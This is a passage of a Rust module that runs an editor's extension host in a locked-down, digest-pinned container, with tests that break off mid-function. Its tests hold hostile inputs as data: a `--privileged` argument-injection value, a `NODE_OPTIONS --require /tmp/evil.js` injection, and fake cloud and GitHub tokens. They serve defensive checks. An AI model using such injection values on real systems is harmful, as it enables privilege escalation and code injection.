//! Where the extension host runs: inside a container, or as a bare process.
//!
//! The three layers in [`crate::host`] all live *inside* the Node process. That
//! leaves one unpinned assumption: the runtime itself. deco borrows `node` from
//! the machine it is installed on, which means the version, the build and
//! everything linked into it are outside deco's control — and the flag that
//! carries layer 1 is a property of that borrowed runtime.
//!
//! A container closes that gap. The image is named by digest, so the runtime an
//! extension lands on is pinned the same way this project pins its CI actions;
//! the network is severed by the kernel rather than by deleting JavaScript
//! globals; and the filesystem an extension can see is decided by what is
//! mounted rather than by a flag it might out-live.
//!
//! # What a container does not do
//!
//! It is worth being precise, because "containerised" is often read as "safe".
//!
//! The workspace is **not mounted**. Extensions read and write files through
//! brokered requests that deco performs on their behalf, so the container needs
//! no view of the project at all — which is what makes this worth doing. Had the
//! workspace been mounted, the container would add very little: the files an
//! extension actually wants are in there, and a bind mount hands them over
//! wholesale.
//!
//! Two directories are mounted read-only: deco's own host code, and the one
//! extension being run. Nothing else, and nothing writable except a small
//! `tmpfs`.
//!
//! # Turning it off
//!
//! [`Sandbox::Process`] runs the host directly, as before. It exists for
//! telling a container problem apart from an extension problem, and it has to
//! be asked for: if a container runtime cannot be found, deco refuses to start
//! the host rather than quietly running it with one layer fewer. A sandbox that
//! silently degrades is worse than no sandbox, because nobody knows which one
//! they have.
//!
//! For the same reason the policy is read from **deco's defaults and the user's
//! own settings only**. A `.vscode/settings.json` arrives with a cloned
//! repository, and a repository that could turn off its own sandbox would make
//! the sandbox decorative. [`overridden_by`] reports the layers that tried, so
//! the attempt can be shown rather than swallowed.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use deco_config::{Scope, Settings};

use crate::host::{build_spec, HostConfig, HostSpec};

/// The setting choosing how the host is isolated.
pub const SANDBOX_KEY: &str = "deco.extensions.sandbox";

/// The setting naming the container runtime.
pub const RUNTIME_KEY: &str = "deco.extensions.containerRuntime";

/// The setting naming the image the host runs in.
pub const IMAGE_KEY: &str = "deco.extensions.containerImage";

/// The image the host runs in unless the user names another.
///
/// Pinned by digest, not by tag: a tag is a mutable pointer, and "the runtime
/// extensions execute on" is exactly the kind of thing this project pins. This
/// digest is the multi-architecture index for `node:22-bookworm-slim`
/// (amd64, arm64, armv7, ppc64le) and carries Node 22.23.2 — comfortably past
/// the 22.13 that `--permission` needs. `bookworm-slim` rather than `alpine`
/// because extensions ship prebuilt native modules linked against glibc.
pub const DEFAULT_IMAGE: &str = "docker.io/library/node:22-bookworm-slim@sha256:d649c27dae7ba0137b3cef5dd75baa422c08dc3d9e3fc0c23dfb172dc3cc6436";

/// Runtimes tried, in order, when the user has not named one.
///
/// Podman first: it is rootless by default, so the daemon that starts the
/// container is not itself running as root.
pub const RUNTIMES: [&str; 2] = ["podman", "docker"];

/// Where mounts are placed inside the container.
const MOUNT_ROOT: &str = "/deco/mnt";

/// The writable `tmpfs`, in megabytes. Node wants somewhere to put a temporary
/// file; the rest of the filesystem is read-only.
const TMPFS_MB: u64 = 16;

/// Added to the V8 heap cap to get the container's memory limit. A Node process
/// is its heap plus its own code, stacks and buffers, and a container killed for
/// being 20MB over its heap would look like a mysterious crash.
const MEMORY_MARGIN_MB: u64 = 256;

/// How many processes the container may hold.
const PIDS_LIMIT: u64 = 256;

/// The container's hostname.
///
/// Fixed rather than left to the runtime, which uses the container id: the point
/// of building the environment by hand is that what an extension can read is
/// decided, and an id that changes every run is neither decided nor useful.
const HOSTNAME: &str = "deco-host";

/// The variables an extension sees inside the container that deco did not put
/// there: the image's own.
///
/// Documented rather than fought: `PATH` is how the runtime finds `node` at all,
/// and the rest is metadata the Node image sets in its own layers. What matters
/// is that none of it comes from deco's environment, and that this list is short
/// enough to state — a name appearing here that is not in it means the image
/// changed under us.
pub const IMAGE_ENVIRONMENT: [&str; 5] =
    ["HOME", "HOSTNAME", "NODE_VERSION", "PATH", "YARN_VERSION"];

/// Variables a container runtime adds on its own account.
///
/// Podman sets `container=podman` so that software inside can tell it is
/// containerised, which is an OCI convention; Docker sets nothing. Neither comes
/// from deco, and neither carries anything about the machine — but they are named
/// here so that the test asserting what an extension can see can be specific
/// about what it tolerates instead of tolerating whatever it finds.
pub const RUNTIME_INJECTED: [&str; 1] = ["container"];

/// The variables the **container runtime** keeps from deco's environment.
///
/// An inversion worth stating: everywhere else in this crate the environment is
/// built from nothing, because the process being started is the untrusted one.
/// Here the process being started is `docker` or `podman`, which has to find its
/// daemon — and the untrusted code is on the far side of the container, where it
/// sees only what `--env` passes it. So the CLI keeps the few variables that
/// tell it where to connect, and nothing that looks like a credential.
pub const RUNTIME_ENVIRONMENT: [&str; 7] = [
    // Finding the daemon. Podman rootless keeps its socket under the runtime
    // directory; Docker takes an explicit host or a named context.
    "CONTAINER_HOST",
    "DOCKER_CONTEXT",
    "DOCKER_HOST",
    "XDG_RUNTIME_DIR",
    // Finding its own configuration.
    "HOME",
    "PATH",
    // Windows needs this to start anything at all.
    "SystemRoot",
];

/// How the extension host is isolated.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum Sandbox {
    /// In a container, with the runtime pinned by digest. The default.
    #[default]
    Container,
    /// Directly, as a child process of deco. Must be asked for explicitly.
    Process,
}

impl Sandbox {
    /// Reads the setting's spelling.
    pub fn parse(value: &str) -> Option<Self> {
        match value {
            "container" => Some(Self::Container),
            "process" => Some(Self::Process),
            _ => None,
        }
    }

    /// The spelling used in settings.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Container => "container",
            Self::Process => "process",
        }
    }
}

/// Failure to prepare a sandbox.
#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum SandboxError {
    /// No container runtime was found, and the policy asks for one.
    #[error(
        "no container runtime found (tried {tried}); install Podman or Docker, \
         or set `{SANDBOX_KEY}` to \"process\" to run the extension host \
         without a container"
    )]
    NoRuntime {
        /// The names that were looked for, for the message.
        tried: String,
    },
    /// The named runtime is not one deco will run.
    #[error(
        "`{name}` is not a container runtime deco will start; name `podman`, \
         `docker`, or an absolute path to one"
    )]
    UnknownRuntime {
        /// What was named.
        name: String,
    },
    /// The image is not pinned to a digest.
    #[error(
        "the extension host image must be pinned by digest, as \
         `name@sha256:<64 hex>`, but `{image}` is not: a tag can be moved, and \
         the runtime extensions execute on is not a moving target"
    )]
    UnpinnedImage {
        /// What was named.
        image: String,
    },
    /// A value would have been read as an option rather than as itself.
    #[error("`{value}` starts with `-`, which the container runtime would read as an option")]
    LooksLikeAnOption {
        /// What was named.
        value: String,
    },
    /// A path cannot be expressed as a mount.
    #[error("{path} cannot be mounted: {why}")]
    Unmountable {
        /// The offending path.
        path: String,
        /// Why it cannot be used.
        why: &'static str,
    },
    /// The bootstrap is not inside anything that gets mounted.
    #[error(
        "the host bootstrap at {bootstrap} is not inside any mounted directory, \
         so the container could not read it"
    )]
    BootstrapNotMounted {
        /// The bootstrap path.
        bootstrap: String,
    },
}

/// The isolation policy, read from the layers that are allowed to set it.
///
/// Unreadable or unknown values fall back to the default rather than to
/// [`Sandbox::Process`]: a typo must not be a way to lose a layer.
pub fn policy(settings: &Settings) -> Sandbox {
    trusted(settings, SANDBOX_KEY)
        .and_then(|value| value.as_str())
        .and_then(Sandbox::parse)
        .unwrap_or_default()
}

/// The scopes that set `key` but are not allowed to.
///
/// Returned so a caller can *say* that a workspace tried to change the sandbox.
/// Ignoring it silently would leave the user believing whichever answer they
/// last read about.
pub fn overridden_by(settings: &Settings, key: &str) -> Vec<Scope> {
    [Scope::Workspace, Scope::Folder, Scope::Remote]
        .into_iter()
        .filter(|scope| {
            settings
                .layer(*scope)
                .is_some_and(|layer| layer.contains_key(key))
        })
        .collect()
}

/// A setting's value, from deco's defaults or the user's own file only.
fn trusted<'a>(settings: &'a Settings, key: &str) -> Option<&'a serde_json::Value> {
    [Scope::User, Scope::Default]
        .into_iter()
        .find_map(|scope| settings.layer(scope).and_then(|layer| layer.get(key)))
}

/// Everything about the container the host runs in.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ContainerConfig {
    /// Absolute path to `podman` or `docker`.
    pub runtime: PathBuf,
    /// The image, pinned by digest.
    pub image: String,
    /// The Node program **inside the image**. Passed as `--entrypoint`, so the
    /// image's own entrypoint script never runs: the argv the container starts
    /// with is the one deco built, not one a layer chose.
    pub node: String,
}

impl ContainerConfig {
    /// Reads the container configuration out of settings and the environment.
    ///
    /// `path` is the `PATH` to search for a runtime — a parameter rather than a
    /// read of the process environment so that the search is testable.
    pub fn resolve(
        settings: &Settings,
        path: Option<&std::ffi::OsStr>,
    ) -> Result<Self, SandboxError> {
        let runtime = match trusted(settings, RUNTIME_KEY).and_then(|value| value.as_str()) {
            Some(named) => {
                let named = named.trim();
                let path_of = Path::new(named);
                if path_of.is_absolute() {
                    path_of.to_path_buf()
                } else if RUNTIMES.contains(&named) {
                    find_runtime(&[named], path).ok_or_else(|| SandboxError::NoRuntime {
                        tried: named.to_owned(),
                    })?
                } else {
                    return Err(SandboxError::UnknownRuntime {
                        name: named.to_owned(),
                    });
                }
            }
            None => find_runtime(&RUNTIMES, path).ok_or_else(|| SandboxError::NoRuntime {
                tried: RUNTIMES.join(", "),
            })?,
        };

        let image = trusted(settings, IMAGE_KEY)
            .and_then(|value| value.as_str())
            .map(|named| named.trim().to_owned())
            .unwrap_or_else(|| DEFAULT_IMAGE.to_owned());
        check_pinned(&image)?;
        not_an_option(&image)?;

        Ok(Self {
            runtime,
            image,
            node: "node".to_owned(),
        })
    }

    /// The memory ceiling for a host with these limits, in megabytes.
    fn memory_mb(limits: &crate::host::HostLimits) -> u64 {
        limits.max_old_space_mb + MEMORY_MARGIN_MB
    }
}

/// Finds the first of `names` on `path`, as an absolute path.
///
/// Absolute because [`crate::connection::Host::spawn`] refuses a bare name — the
/// environment it starts a process with has no `PATH` for the operating system
/// to search.
pub fn find_runtime(names: &[&str], path: Option<&std::ffi::OsStr>) -> Option<PathBuf> {
    let path = path?;
    for name in names {
        let file = if cfg!(windows) {
            format!("{name}.exe")
        } else {
            (*name).to_owned()
        };
        if let Some(found) = std::env::split_paths(&path)
            .map(|dir| dir.join(&file))
            .find(|candidate| candidate.is_file())
        {
            return Some(found);
        }
    }
    None
}

/// Refuses an image that is not pinned to a digest.
fn check_pinned(image: &str) -> Result<(), SandboxError> {
    let unpinned = || SandboxError::UnpinnedImage {
        image: image.to_owned(),
    };
    let (_, digest) = image.rsplit_once("@sha256:").ok_or_else(unpinned)?;
    if digest.len() != 64 || !digest.bytes().all(|b| b.is_ascii_hexdigit()) {
        return Err(unpinned());
    }
    Ok(())
}

/// Refuses a value the runtime would read as an option.
fn not_an_option(value: &str) -> Result<(), SandboxError> {
    if value.starts_with('-') {
        return Err(SandboxError::LooksLikeAnOption {
            value: value.to_owned(),
        });
    }
    Ok(())
}

/// Which host directory is mounted where inside the container.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Mounts {
    entries: Vec<(PathBuf, String)>,
}

impl Mounts {
    /// Places each root at `/deco/mnt/<n>`, in the order given.
    ///
    /// Numbered rather than named after the directory, because a host path
    /// becomes part of the container's filesystem layout and the extension has
    /// no business learning where deco keeps things on this machine.
    pub fn new(roots: &[PathBuf]) -> Result<Self, SandboxError> {
        let mut entries = Vec::with_capacity(roots.len());
        for (index, root) in roots.iter().enumerate() {
            let shown = root.display().to_string();
            if !root.is_absolute() {
                return Err(SandboxError::Unmountable {
                    path: shown,
                    why: "a mount source has to be an absolute path",
                });
            }
            // `--mount` takes comma-separated options, so a comma in the source
            // would end the source and start something else. Refused rather
            // than escaped: there is no escape the option parser respects.
            if shown.contains(',') {
                return Err(SandboxError::Unmountable {
                    path: shown,
                    why: "a comma would be read as the end of the mount source",
                });
            }
            entries.push((root.clone(), format!("{MOUNT_ROOT}/{index}")));
        }
        Ok(Self { entries })
    }

    /// The container path for a host path inside one of the mounted roots.
    ///
    /// `None` for anything outside them, which is the honest answer: the
    /// container cannot see it.
    pub fn inside(&self, path: &Path) -> Option<String> {
        for (root, target) in &self.entries {
            if !crate::capability::is_within(path, root) {
                continue;
            }
            // `is_within` compares normalised paths and this does not, so the two
            // can disagree — a root written with a `.` in it, say. Then this root
            // is not the answer, but another one still might be, which is why this
            // keeps looking instead of returning.
            let Ok(suffix) = path.strip_prefix(root) else {
                continue;
            };
            let mut translated = target.clone();
            for part in suffix.components() {
                translated.push('/');
                translated.push_str(&part.as_os_str().to_string_lossy());
            }
            return Some(translated);
        }
        None
    }

    /// The container paths, in mount order.
    pub fn targets(&self) -> Vec<&str> {
        self.entries
            .iter()
            .map(|(_, target)| target.as_str())
            .collect()
    }

    /// The `--mount` arguments, in mount order.
    fn arguments(&self) -> Vec<String> {
        self.entries
            .iter()
            .flat_map(|(source, target)| {
                [
                    "--mount".to_owned(),
                    format!(
                        "type=bind,source={},target={target},readonly",
                        source.display()
                    ),
                ]
            })
            .collect()
    }
}

/// A host command line that runs inside a container, and where things ended up.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Containerised {
    /// The command to run: the container runtime, with the host's own command
    /// line after the image.
    pub spec: HostSpec,
    /// Where each readable root was mounted, for translating the paths that go
    /// over the wire afterwards.
    pub mounts: Mounts,
}

/// Builds the command line that starts the host inside a container.
///
/// The Node flags are not restated here: the translated configuration goes
/// through [`build_spec`], which stays the one place that knows what the host's
/// command line looks like. Only the container's own options are added, and they
/// are the whole reason for this module:
///
/// - `--network=none` severs the network in the kernel. Layer 2 deletes
///   `fetch` and refuses `net`, which is a clear error rather than a barrier; a
///   native module has no such manners.
/// - `--read-only`, plus a small `tmpfs` and two read-only mounts, means there
///   is nowhere to write and nothing to read that deco did not offer.
/// - `--cap-drop=ALL` and `--security-opt=no-new-privileges` leave nothing to
///   escalate with.
/// - `--memory` and `--pids-limit` make a runaway extension the container's
///   problem instead of the machine's.
///
/// deco does not pass `--user`. Under rootless Podman the container's root is
/// already the user's own unprivileged uid, and naming a uid there maps it into
/// a subordinate range that cannot read the bind mounts — so the flag would
/// break the common case while adding nothing to it.
pub fn containerise(
    config: &HostConfig,
    container: &ContainerConfig,
    extension_id: &str,
) -> Result<Containerised, SandboxError> {
    check_pinned(&container.image)?;
    not_an_option(&container.image)?;
    not_an_option(&container.node)?;

    let mounts = Mounts::new(&config.readable_roots)?;
    let bootstrap =
        mounts
            .inside(&config.bootstrap)
            .ok_or_else(|| SandboxError::BootstrapNotMounted {
                bootstrap: config.bootstrap.display().to_string(),
            })?;

    // The same configuration seen from inside the container: every path is one
    // the container has, and `node` is whatever the image calls it.
    let inside = HostConfig {
        node: PathBuf::from(&container.node),
        bootstrap: PathBuf::from(&bootstrap),
        readable_roots: mounts.targets().into_iter().map(PathBuf::from).collect(),
        // Nothing to write, so the working directory is the first mount, which
        // is deco's own host code.
        cwd: PathBuf::from(mounts.targets().first().copied().unwrap_or(MOUNT_ROOT)),
        limits: config.limits,
        node_permission_model: config.node_permission_model,
        allow_code_generation: config.allow_code_generation,
    };
    let host = build_spec(&inside, extension_id);

    let mut args = vec![
        "run".to_owned(),
        "--rm".to_owned(),
        "--interactive".to_owned(),
        "--network=none".to_owned(),
        "--read-only".to_owned(),
        "--cap-drop=ALL".to_owned(),
        "--security-opt=no-new-privileges".to_owned(),
        // Otherwise the runtime sets `HOSTNAME` to the container's id, which is
        // one more thing an extension can see that differs run to run. Fixed, so
        // that what reaches the extension is the same every time and can
        // therefore be asserted exactly.
        format!("--hostname={HOSTNAME}"),
        format!("--pids-limit={PIDS_LIMIT}"),
        format!("--memory={}m", ContainerConfig::memory_mb(&config.limits)),
        format!("--tmpfs=/tmp:rw,noexec,nosuid,size={TMPFS_MB}m"),
    ];
    args.extend(mounts.arguments());
    args.push("--workdir".to_owned());
    args.push(inside.cwd.display().to_string());
    // The two variables the host is given. `--env NAME=value` rather than
    // `--env NAME`, which would copy deco's own value of it through.
    for (key, value) in &host.env {
        // A Windows-only variable means nothing to a Linux container, and
        // `SystemRoot` is added by `build_spec` for the sake of starting Node on
        // Windows itself.
        if !key.starts_with("DECO_") {
            continue;
        }
        args.push("--env".to_owned());
        args.push(format!("{key}={value}"));
    }
    args.push("--entrypoint".to_owned());
    args.push(container.node.clone());
    args.push(container.image.clone());
    // Everything after the image is Node's own command line, unchanged.
    args.extend(host.args);

    Ok(Containerised {
        spec: HostSpec {
            program: container.runtime.clone(),
            args,
            env: runtime_environment(std::env::vars_os()),
            // Where the *client* runs. It does not reach the container — the
            // working directory inside is `--workdir` above — so this is only
            // somewhere that exists.
            cwd: config.cwd.clone(),
        },
        mounts,
    })
}

/// A host that is ready to start, and what was decided along the way.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Prepared {
    /// The command line to run.
    pub spec: HostSpec,
    /// Which policy this spec implements.
    pub sandbox: Sandbox,
    /// Where each readable root was mounted, or `None` outside a container,
    /// where host paths are already the paths the host sees.
    pub mounts: Option<Mounts>,
    /// Settings layers that tried to choose the sandbox and were not allowed to.
    ///
    /// Carried out rather than logged in here, because whether this is a warning
    /// in the status bar or a line in a log is the frontend's business — but it
    /// must not be nobody's.
    pub ignored: Vec<Scope>,
}

impl Prepared {
    /// The path the host will know a host path by.
    ///
    /// The one function callers need for the container to be invisible to them:
    /// an `extensionPath` on the wire has to be a path the *host* can open, and
    /// which that is depends on the policy.
    pub fn seen_by_host(&self, path: &Path) -> Option<String> {
        match &self.mounts {
            Some(mounts) => mounts.inside(path),
            None => Some(path.display().to_string()),
        }
    }
}

/// Decides how to start the host, and builds the command line for it.
///
/// This is the whole decision in one place: read the policy from the layers
/// allowed to set it, and either containerise or don't. There is deliberately no
/// path that falls back from one to the other — a caller that cannot get a
/// container gets an error naming the setting, and a user who wants the process
/// says so.
pub fn prepare(
    settings: &Settings,
    config: &HostConfig,
    extension_id: &str,
    path: Option<&std::ffi::OsStr>,
) -> Result<Prepared, SandboxError> {
    let sandbox = policy(settings);
    let ignored = [SANDBOX_KEY, RUNTIME_KEY, IMAGE_KEY]
        .into_iter()
        .flat_map(|key| overridden_by(settings, key))
        .collect::<std::collections::BTreeSet<_>>()
        .into_iter()
        .collect();

    match sandbox {
        Sandbox::Container => {
            let container = ContainerConfig::resolve(settings, path)?;
            let made = containerise(config, &container, extension_id)?;
            Ok(Prepared {
                spec: made.spec,
                sandbox,
                mounts: Some(made.mounts),
                ignored,
            })
        }
        Sandbox::Process => Ok(Prepared {
            spec: build_spec(config, extension_id),
            sandbox,
            mounts: None,
            ignored,
        }),
    }
}

/// The environment the container runtime is started with: the allowlist above,
/// and only where the parent actually has the variable.
pub fn runtime_environment(
    parent: impl IntoIterator<Item = (std::ffi::OsString, std::ffi::OsString)>,
) -> BTreeMap<String, String> {
    let mut env = BTreeMap::new();
    for (key, value) in parent {
        let key = key.to_string_lossy().into_owned();
        if RUNTIME_ENVIRONMENT.contains(&key.as_str()) {
            env.insert(key, value.to_string_lossy().into_owned());
        }
    }
    env
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::host::HostLimits;
    use serde_json::json;

    fn settings(scope: Scope, key: &str, value: serde_json::Value) -> Settings {
        let mut settings = Settings::empty();
        let mut layer = serde_json::Map::new();
        layer.insert(key.to_owned(), value);
        settings.set_layer(scope, layer);
        settings
    }

    /// A path this platform calls absolute, from Unix-shaped parts.
    ///
    /// Every path in these tests goes through here, and the reason is a real
    /// failure: written as the literal `/opt/deco/host`, twelve tests below
    /// silently changed what they were testing on Windows. `/opt/deco/host` has
    /// no drive letter, so `Mounts::new` refused it as relative — and each test
    /// asserting a *successful* spec was really asserting the refusal path, while
    /// looking exactly as green on Linux as before.
    fn absolute(parts: &str) -> PathBuf {
        let parts = parts.trim_start_matches('/');
        if cfg!(windows) {
            PathBuf::from(format!("C:\\{}", parts.replace('/', "\\")))
        } else {
            PathBuf::from(format!("/{parts}"))
        }
    }

    /// The same, as the string a settings file would hold.
    fn absolute_str(parts: &str) -> String {
        absolute(parts).display().to_string()
    }

    fn config() -> HostConfig {
        HostConfig {
            node: absolute("usr/bin/node"),
            bootstrap: absolute("opt/deco/host/src/bootstrap.js"),
            readable_roots: vec![
                absolute("opt/deco/host"),
                absolute("home/u/.deco/extensions/acme.ext"),
            ],
            cwd: absolute("home/u/project"),
            limits: HostLimits::default(),
            node_permission_model: true,
            allow_code_generation: false,
        }
    }

    fn container() -> ContainerConfig {
        ContainerConfig {
            runtime: absolute("usr/bin/podman"),
            image: DEFAULT_IMAGE.to_owned(),
            node: "node".to_owned(),
        }
    }

    #[test]
    fn the_fixtures_use_paths_this_platform_calls_absolute() {
        // The guard for the failure described on `absolute`. Without it the suite
        // can only be trusted on the platform it was written on, and the way it
        // fails is by passing.
        let config = config();
        let mut paths = vec![config.bootstrap, config.cwd, container().runtime];
        paths.extend(config.readable_roots);
        for path in paths {
            assert!(
                path.is_absolute(),
                "{} is not absolute here, so the fixture is testing a refusal",
                path.display()
            );
        }
    }

    #[test]
    fn the_default_is_a_container() {
        assert_eq!(Sandbox::default(), Sandbox::Container);
        assert_eq!(policy(&Settings::empty()), Sandbox::Container);
        assert_eq!(policy(&Settings::with_defaults()), Sandbox::Container);
    }

    #[test]
    fn the_user_may_turn_the_container_off_and_a_workspace_may_not() {
        let user = settings(Scope::User, SANDBOX_KEY, json!("process"));
        assert_eq!(policy(&user), Sandbox::Process);

        // The case this rule exists for: a repository that arrives with a
        // `.vscode/settings.json` turning off the sandbox that would have
        // contained its own extensions.
        for scope in [Scope::Workspace, Scope::Folder, Scope::Remote] {
            let sneaky = settings(scope, SANDBOX_KEY, json!("process"));
            assert_eq!(
                policy(&sneaky),
                Sandbox::Container,
                "{scope:?} should not be able to turn the sandbox off"
            );
            assert_eq!(overridden_by(&sneaky, SANDBOX_KEY), vec![scope]);
        }
    }

    #[test]
    fn an_attempt_to_override_is_reported_rather_than_swallowed() {
        let mut settings = settings(Scope::Workspace, SANDBOX_KEY, json!("process"));
        let mut folder = serde_json::Map::new();
        folder.insert(IMAGE_KEY.to_owned(), json!("evil@sha256:00"));
        settings.set_layer(Scope::Folder, folder);
        assert_eq!(
            overridden_by(&settings, SANDBOX_KEY),
            vec![Scope::Workspace]
        );
        assert_eq!(overridden_by(&settings, IMAGE_KEY), vec![Scope::Folder]);
        assert!(overridden_by(&settings, RUNTIME_KEY).is_empty());
    }

    #[test]
    fn a_misspelled_policy_keeps_the_container_rather_than_losing_it() {
        for value in [json!("Process"), json!("none"), json!(false), json!(0)] {
            let settings = settings(Scope::User, SANDBOX_KEY, value.clone());
            assert_eq!(
                policy(&settings),
                Sandbox::Container,
                "{value} should not have turned the sandbox off"
            );
        }
    }

    #[test]
    fn the_policy_round_trips_through_its_spelling() {
        for policy in [Sandbox::Container, Sandbox::Process] {
            assert_eq!(Sandbox::parse(policy.as_str()), Some(policy));
        }
        assert_eq!(Sandbox::parse("container"), Some(Sandbox::Container));
        assert_eq!(Sandbox::parse(""), None);
    }

    #[test]
    fn the_shipped_image_is_pinned_to_a_digest() {
        // The whole point of naming a default: if this ever becomes a tag, every
        // guarantee about the runtime becomes "whatever was pushed last".
        assert!(check_pinned(DEFAULT_IMAGE).is_ok(), "{DEFAULT_IMAGE}");
        assert!(DEFAULT_IMAGE.contains("@sha256:"));
    }

    #[test]
    fn an_image_that_is_not_pinned_is_refused() {
        for image in [
            "node:22",
            "node:22-bookworm-slim",
            "node@sha256:abc",
            "node@sha512:0000000000000000000000000000000000000000000000000000000000000000",
            "node@sha256:zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz",
        ] {
            assert_eq!(
                check_pinned(image),
                Err(SandboxError::UnpinnedImage {
                    image: image.to_owned()
                }),
                "{image} should have been refused"
            );
        }
    }

    #[test]
    fn a_value_the_runtime_would_read_as_an_option_is_refused() {
        // `docker run … --privileged` reads as an option wherever it appears, so
        // an image or entrypoint starting with a dash is an argument-injection
        // hole and not merely an odd name.
        let mut config = container();
        config.image = format!("--privileged {DEFAULT_IMAGE}");
        assert!(matches!(
            containerise(&self::config(), &config, "acme.ext"),
            Err(SandboxError::UnpinnedImage { .. } | SandboxError::LooksLikeAnOption { .. })
        ));

        let mut config = container();
        config.node = "--privileged".to_owned();
        assert_eq!(
            containerise(&self::config(), &config, "acme.ext"),
            Err(SandboxError::LooksLikeAnOption {
                value: "--privileged".to_owned()
            })
        );
    }

    #[test]
    fn the_container_severs_the_network_and_writes_nothing() {
        let made = containerise(&config(), &container(), "acme.ext").expect("a spec");
        let args = made.spec.args.join(" ");
        for expected in [
            "--network=none",
            "--read-only",
            "--cap-drop=ALL",
            "--security-opt=no-new-privileges",
            "--rm",
            "--interactive",
        ] {
            assert!(args.contains(expected), "{expected} missing from {args}");
        }
        assert!(!args.contains("--privileged"));
        assert!(!args.contains("--network=host"));
        // The only writable thing, and it cannot hold a program.
        assert!(args.contains("--tmpfs=/tmp:rw,noexec,nosuid,size=16m"));
    }

    #[test]
    fn the_workspace_is_not_mounted() {
        // The reason a container is worth its cost here. `cwd` is the project;
        // it must not appear as a mount, and nothing outside the two readable
        // roots may either.
        let config = config();
        let made = containerise(&config, &container(), "acme.ext").expect("a spec");
        let mounts: Vec<&String> = made
            .spec
            .args
            .iter()
            .filter(|arg| arg.starts_with("type=bind"))
            .collect();
        assert_eq!(mounts.len(), 2, "{mounts:?}");
        assert!(!made
            .spec
            .args
            .iter()
            .any(|arg| arg.contains(&absolute_str("home/u/project"))));
        for mount in mounts {
            assert!(mount.ends_with("readonly"), "{mount} is writable");
        }
    }

    #[test]
    fn the_host_command_line_is_the_same_one_only_with_container_paths() {
        let made = containerise(&config(), &container(), "acme.ext").expect("a spec");
        let args = made.spec.args.join(" ");
        // Layer 1 is not dropped because layer 0 arrived: they are independent.
        assert!(args.contains("--permission"));
        assert!(args.contains("--disallow-code-generation-from-strings"));
        assert!(args.contains("--max-old-space-size=512"));
        // Paths are the container's.
        assert!(args.ends_with("/deco/mnt/0/src/bootstrap.js"), "{args}");
        assert!(args.contains("--allow-fs-read=/deco/mnt/0"));
        assert!(args.contains("--allow-fs-read=/deco/mnt/1"));
        assert!(!args.contains(&format!(
            "--allow-fs-read={}",
            absolute_str("opt/deco/host")
        )));

        // A host path appears exactly once, as the source of its own mount —
        // the runtime is the one thing that has to know where deco keeps
        // things. Nothing the *extension* is handed mentions this machine's
        // layout, which is the part that matters: it is the argv after the
        // image that Node, and therefore the extension, can read.
        let image = made
            .spec
            .args
            .iter()
            .position(|arg| arg == DEFAULT_IMAGE)
            .expect("the image");
        let handed_to_node = made.spec.args[image + 1..].join(" ");
        for host_path in [
            absolute_str("opt/deco/host"),
            absolute_str("home/u/.deco/extensions"),
            absolute_str("home/u/project"),
        ] {
            assert!(
                !handed_to_node.contains(&host_path),
                "{host_path} reached the extension in {handed_to_node}"
            );
        }
    }

    #[test]
    fn the_image_is_the_last_thing_before_nodes_own_arguments() {
        let made = containerise(&config(), &container(), "acme.ext").expect("a spec");
        let image = made
            .spec
            .args
            .iter()
            .position(|arg| arg == DEFAULT_IMAGE)
            .expect("the image should be in the argv");
        // Everything after it is Node's, so a container option cannot be
        // smuggled in by anything that only appends.
        assert_eq!(made.spec.args[image - 2], "--entrypoint");
        assert_eq!(made.spec.args[image - 1], "node");
        assert!(made.spec.args[image + 1..].iter().all(|arg| arg
            .starts_with("--max-old-space-size")
            || arg.starts_with("--disallow-code")
            || arg == "--permission"
            || arg.starts_with("--allow-fs-read=")
            || arg.ends_with("bootstrap.js")));
    }

    #[test]
    fn the_extension_sees_only_decos_own_two_variables() {
        let made = containerise(&config(), &container(), "acme.ext").expect("a spec");
        let passed: Vec<&String> = made
            .spec
            .args
            .iter()
            .zip(made.spec.args.iter().skip(1))
            .filter(|(flag, _)| *flag == "--env")
            .map(|(_, value)| value)
            .collect();
        assert_eq!(
            passed,
            vec![
                &"DECO_EXTENSION_ID=acme.ext".to_owned(),
                &format!("DECO_HOST_PROTOCOL={}", crate::host::PROTOCOL_VERSION),
            ]
        );
        // `--env NAME` with no value copies the parent's, which is exactly the
        // leak the whole environment design exists to prevent.
        assert!(!made.spec.args.iter().any(|arg| arg == "--env-file"));
    }

    #[test]
    fn the_runtime_keeps_what_it_needs_to_find_a_daemon_and_nothing_else() {
        let parent = [
            ("DOCKER_HOST", "unix:///run/user/1000/podman/podman.sock"),
            ("PATH", "/usr/bin"),
            ("HOME", "/home/u"),
            ("GITHUB_TOKEN", "ghp_should_not_appear"),
            ("AWS_SECRET_ACCESS_KEY", "also_not"),
            ("NODE_OPTIONS", "--require /tmp/evil.js"),
        ]
        .into_iter()
        .map(|(k, v)| (std::ffi::OsString::from(k), std::ffi::OsString::from(v)));
        let env = runtime_environment(parent);
        assert_eq!(
            env.keys().collect::<Vec<_>>(),
            vec!["DOCKER_HOST", "HOME", "PATH"]
        );
        // `NODE_OPTIONS` would inject a `--require` into the runtime's own Node
        // if it had one, and is not needed to find a daemon either way.
        assert!(!env.contains_key("NODE_OPTIONS"));
    }

    #[test]
    fn memory_is_the_heap_plus_room_for_the_process_around_it() {
        let limits = HostLimits {
            max_old_space_mb: 512,
            ..HostLimits::default()
        };
        assert_eq!(ContainerConfig::memory_mb(&limits), 512 + MEMORY_MARGIN_MB);
        let made = containerise(&config(), &container(), "acme.ext").expect("a spec");
        assert!(made.spec.args.contains(&"--memory=768m".to_owned()));
        assert!(made.spec.args.contains(&"--pids-limit=256".to_owned()));
    }

    #[test]
    fn a_relative_root_cannot_be_mounted() {
        let mut config = config();
        config.readable_roots = vec![PathBuf::from("host")];
        assert!(matches!(
            containerise(&config, &container(), "acme.ext"),
            Err(SandboxError::Unmountable { .. })
        ));
    }

    #[test]
    fn a_comma_in_a_path_is_refused_rather_than_escaped() {
        // `--mount type=bind,source=/a,b,target=/x` parses as a source of `/a`
